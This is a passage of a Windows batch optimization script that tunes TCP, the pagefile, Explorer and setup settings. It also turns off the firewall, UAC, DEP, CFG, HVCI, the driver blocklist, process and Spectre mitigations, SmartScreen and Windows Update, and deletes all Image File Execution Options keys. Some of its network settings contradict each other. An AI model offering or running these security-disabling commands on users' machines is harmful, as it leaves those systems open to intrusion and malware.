Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Component Based Servicing" /v "EnableDpxLog" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Ole" /v "EnableDCOM" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Ole" /v "EnableDCOM" /t REG_SZ /d "N" /f >nul
@timeout /t 02 /nobreak >nul
DISM /Online /Remove-Capability /CapabilityName:Browser.InternetExplorer~~~~0.0.11.0 /norestart /quiet
DISM /Online /Remove-Capability /CapabilityName:MathRecognizer~~~~0.0.1.0 /norestart /quiet
DISM /Online /Remove-Capability /CapabilityName:Microsoft.Windows.PowerShell.ISE~~~~0.0.1.0 /norestart /quiet
DISM /Online /Remove-Capability /CapabilityName:OneCoreUAP.OneSync~~~~0.0.1.0 /norestart /quiet
DISM /Online /Set-ReservedStorageState /State:Disabled
@timeout /t 02 /nobreak >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Dsh" /v "AllowNewsAndInterests" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config" /v "VulnerableDriverBlocklistEnable" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /ve /t REG_SZ /d "" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowTaskViewButton" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarDa" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "FolderContentsInfoTip" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKU\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "FolderContentsInfoTip" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "LaunchTo" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKU\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "LaunchTo" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowInfoTip" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKU\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowInfoTip" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSyncProviderNotifications" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKU\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSyncProviderNotifications" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKU\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarMn" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKU\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarMn" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewAlphaSelect" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "NoNetCrawling" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAutoHideInTabletMode" /t REG_DWORD /d "0" /f >nul
@timeout /t 02 /nobreak >nul
Reg.exe add "HKLM\Software\Microsoft\Dfrg\TaskSettings" /v "fAllVolumes" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\Software\Microsoft\Dfrg\TaskSettings" /v "fExclude" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Microsoft\Dfrg\TaskSettings" /v "Volumes" /t REG_SZ /d " " /f >nul
Reg.exe add "HKLM\Software\Microsoft\Dfrg\TaskSettings" /v "TaskFrequency" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\Software\Microsoft\Dfrg\TaskSettings" /v "fDeadlineEnabled" /t REG_DWORD /d "1" /f >nul
@timeout /t 02 /nobreak >nul
Reg.exe add "HKLM\System\ControlSet001\Services\SharedAccess\Epoch" /v "Epoch" /t REG_DWORD /d "233" /f >nul
Reg.exe add "HKLM\System\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "DisableNotifications" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\System\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "EnableFirewall" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\System\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "DisableNotifications" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\System\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d "0" /f >nul
NetSh Advfirewall set allprofiles state off
@timeout /t 02 /nobreak >nul
Reg.exe add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\Win32kWPP\Parameters" /v "LogPages" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows\Win32kWPP\Parameters" /v "LogPages" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\System\ControlSet001\Services\USBHUB3\Parameters" /v "LogPages" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\System\ControlSet001\Services\USBHUB3\Parameters\Wdf" /v "LogPages" /t REG_DWORD /d "0" /f >nul
@timeout /t 02 /nobreak >nul
powershell Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine -Force
powershell Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force
Exit /b

:PAGEFILE
powershell -Command ^
    "$PageFile = Get-WmiObject -Query 'SELECT * FROM Win32_PageFileSetting WHERE Name=''C:\\pagefile.sys''';" ^
    "if ($PageFile) {" ^
    "    $PageFile.InitialSize = 8192;" ^
    "    $PageFile.MaximumSize = 8192;" ^
    "    $PageFile.Put();" ^
    "} else {" ^
    "    $PageFile = ([WmiClass]'\\.\root\cimv2:Win32_PageFileSetting').CreateInstance();" ^
    "    $PageFile.Name = 'C:\\pagefile.sys';" ^
    "    $PageFile.InitialSize = 8192;" ^
    "    $PageFile.MaximumSize = 8192;" ^
    "    $PageFile.Put();" ^
    "}"
Exit /b

:CONFINTL

FOR /F "TOKENS=2,*" %%A IN ('Reg.exe query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\NetworkCards" 2^>NUL^|FIND /I "ServiceName"') DO set SSL0=%%B
FOR /F "TOKENS=2,*" %%A IN ('Reg.exe query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\NetworkCards\1" 2^>NUL^|FIND /I "ServiceName"') DO set SSL1=%%B

IF DEFINED SSL0 (
    Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%SSL0%" /v "TCPNoDelay" /t REG_DWORD /d "1" /f >nul 2>&1
    Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%SSL0%" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f >nul 2>&1
    Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%SSL0%" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f >nul 2>&1
    Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%SSL0%" /v "TcpInitialRTT" /t REG_DWORD /d "300" /f >nul 2>&1
    Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%SSL0%" /v "UseZeroBroadcast" /t REG_DWORD /d "0" /f >nul 2>&1
    Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%SSL0%" /v "DeadGWDetectDefault" /t REG_DWORD /d "1" /f >nul 2>&1
)

IF DEFINED SSL1 (
    Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%SSL1%" /v "TCPNoDelay" /t REG_DWORD /d "1" /f >nul 2>&1
    Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%SSL1%" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f >nul 2>&1
    Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%SSL1%" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f >nul 2>&1
    Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%SSL1%" /v "TcpInitialRTT" /t REG_DWORD /d "300" /f >nul 2>&1
    Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%SSL1%" /v "UseZeroBroadcast" /t REG_DWORD /d "0" /f >nul 2>&1
    Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%SSL1%" /v "DeadGWDetectDefault" /t REG_DWORD /d "1" /f >nul 2>&1
)

Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\IO\NoCap" /v "IOBandwidth" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Memory\NoCap" /v "CommitLimit" /t REG_DWORD /d "4294967295" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Memory\NoCap" /v "CommitTarget" /t REG_DWORD /d "4294967295" /f >nul

Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\QoS" /v "Do not use NLA" /t REG_DWORD /d "1" /f >nul 2>&1
Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f >nul 2>&1

netsh int tcp set supplemental template=Internet
netsh int tcp set supplemental Internet congestionprovider=bbr2 enablecwndrestart=disable
netsh int tcp set security mpp=disabled profiles=disabled
netsh int tcp set heur forcews=disable

netsh int tcp set global ^
    rss=enabled ^
    autotuninglevel=normal ^
    ecncapability=disable ^
    dca=enabled ^
    netdma=disabled ^
    timestamps=disabled ^
    rsc=disabled ^
    nonsackrttresiliency=disabled ^
    maxsynretransmissions=2 ^
    fastopen=enabled ^
    fastopenfallback=default ^
    hystart=disabled ^
    prr=default ^
    pacingprofile=off

netsh int ip set global ^
    groupforwardedfragments=disable ^
    icmpredirects=disabled ^
    minmtu=576 ^
    flowlabel=disable ^
    multicastforwarding=disabled

netsh interface teredo set state disabled
netsh interface 6to4 set state disabled
netsh winsock reset
netsh int isatap set state disable
netsh int ip set global taskoffload=enabled
netsh int ip set global neighborcachelimit=4096
netsh int tcp set global timestamps=disabled
netsh int tcp set heuristics disabled
netsh int tcp set global autotuninglevel=normal
netsh int tcp set global congestionprovider=ctcp
netsh int tcp set supplemental Internet congestionprovider=CTCP
netsh int tcp set global chimney=disabled
netsh int tcp set global ecncapability=disabled
netsh int tcp set global rss=enabled
netsh int tcp set global rsc=disabled
netsh int tcp set global dca=enabled
netsh int tcp set global netdma=enabled
netsh int tcp set global nonsackrttresiliency=disabled
netsh int tcp set security mpp=disabled
netsh int tcp set security profiles=disabled
netsh interface isatap set state disable
netsh int tcp set supplemental internet congestionprovider=bbr2
netsh int tcp set global netdma=disabled
PowerShell Disable-NetAdapterChecksumOffload -Name "*"
PowerShell Disable-NetAdapterLso -Name "*"
PowerShell Disable-NetAdapterRsc -Name "*"
PowerShell Disable-NetAdapterIPsecOffload -Name "*"
PowerShell Disable-NetAdapterPowerManagement -Name "*"
PowerShell Disable-NetAdapterQos -Name "*"
@timeout /t 02>nul
Set-NetAdapterRSS -Name "Ethernet" -NumberOfReceiveQueues 4
Set-NetAdapterRSS -Name "Ethernet" -BaseProcessorNumber 2
ipconfig /flushdns
netsh int ip set dnsservers "Ethernet" static 1.1.1.2 primary
netsh int ip add dns "Ethernet" 1.0.0.2 2

Exit /b

:BATCHSCRIPT_1
Powershell "ForEach($v in (Get-Command -Name \"Set-ProcessMitigation\").Parameters[\"Disable\"].Attributes.ValidValues){Set-ProcessMitigation -System -Disable $v.ToString() -ErrorAction SilentlyContinue}" >nul
Powershell "Remove-Item -Path \"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*\" -Recurse -ErrorAction SilentlyContinue" >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v "DisableExternalDMAUnderLock" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "HVCIMATRequired" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "ProtectionMode" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "MitigationOptions" /t REG_BINARY /d "222222222222222222222222222222222222222222222222" /f >nul
@timeout /t 05 >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet" /v "EnableActiveProbing" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\BootControl" /v "BootProgressAnimation" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "0x16" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager" /v "HeapDeCommitFreeBlockThreshold" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\WindowsStore" /v "AutoDownload" /t REG_DWORD /d "4" /f >nul
Reg.exe add "HKCU\Software\Policies\Microsoft\WindowsStore" /v "DisableOSUpgrade" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\WindowsStore" /v "DisableOSUpgrade" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE" /v "HideOnlineAccountScreens" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE" /v "HideEULAPage" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE" /v "SkipMachineOOBE" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE" /v "SkipUserOOBE" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE" /v "HideWirelessSetupInOOBE" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE" /v "NetworkLocation" /t REG_SZ /d "Home" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE" /v "ProtectYourPC" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE" /v "HideLocalAccountScreen" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE" /v "DisablePrivacyExperience" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE" /v "HideOEMRegistrationScreen" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE" /v "EnableCortanaVoice" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE" /v "DisableVoice" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE\AppSettings" /v "Skype-UserConsentAccepted" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE" /v "BypassNRO" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE" /v "HideOnlineAccountScreens" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE" /v "HideEULAPage" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE" /v "SkipMachineOOBE" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE" /v "SkipUserOOBE" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE" /v "HideWirelessSetupInOOBE" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE" /v "NetworkLocation" /t REG_SZ /d "Home" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE" /v "ProtectYourPC" /t REG_DWORD /d "3" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE" /v "HideLocalAccountScreen" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE" /v "DisablePrivacyExperience" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE" /v "HideOEMRegistrationScreen" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE" /v "EnableCortanaVoice" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OOBE" /v "DisableVoice" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_SZ /d "0" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "00000008" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "00000006" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "AlwaysOn" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NoLazyMode" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "00000018" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "00000018" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DoNotHoldNicBuffers" /t REG_DWORD /d "00000001" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKU\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\GameDVR" /v "HistoricalCaptureEnabled" /t REG_DWORD /d "0" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Internet Explorer\Main" /v "DEPOff" /t REG_DWORD /d 1 /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Explorer" /v "NoDataExecutionPrevention" /t REG_DWORD /d 1 /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\System" /v "DisableHHDEP" /t REG_DWORD /d 1 /f >nul
Reg.exe add "HKLM\Software\Microsoft\PolicyManager\default\DmaGuard\DeviceEnumerationPolicy" /v "value" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\FVE" /v "DisableExternalDMAUnderLock" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\DeviceGuard" /v "HVCIMATRequired" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\AppPrivacy" /v "LetAppsRunInBackground" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Biometrics" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\AppCompat" /v "DisableInventory" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Windows Error Reporting" /v "Disabled" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\AppCompat" /v "AITEnable" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Internet Explorer\SQM" /v "DisableCustomerImprovementProgram" /t REG_DWORD /d 0 /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\AppV\CEIP" /v "CEIPEnable" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Messenger\Client" /v "CEIP" /t REG_DWORD /d "2" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\TabletPC" /v "PreventHandwritingDataSharing" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\HandwritingErrorReports" /v "PreventHandwritingErrorReports" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\AdvertisingInfo" /v "DisabledByGroupPolicy" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\GameBar" /v "GamepadDoublePressIntervalMs" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\GameBar" /v "UseNexusForGameBarEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\ScheduledDiagnostics" /v "EnabledExecution" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "ConfigureAppInstallControl" /t REG_SZ /d "Anywhere" /f >nul
Reg.exe add "HKLM\Software\Policies\Microsoft\MRT" /v "DontReportInfectionInformation" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\Software\Microsoft\Input\Settings" /v "HarvestContacts" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "ConfigureAppInstallControlEnabled" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Consent" /v "DefaultConsent" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUPowerManagement" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "IncludeRecommendedUpdates" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "GlobalTimerResolutionRequests" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f >nul
Exit /b
:BATCHSCRIPT_2
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OptimalLayout" /v "EnableAutoLayout" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Dfrg\BootOptimizeFunction" /v "Enable" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "EnableVirtualization" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnabledExecution" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableVirtualization" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableInstallerDetection" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableSecureUIAPaths" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ValidateAdminCodeSignatures" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableUIADesktopToggle" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableFirstLogonAnimation" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableStartupSound" /t REG_DWORD /d "1" /f >nul
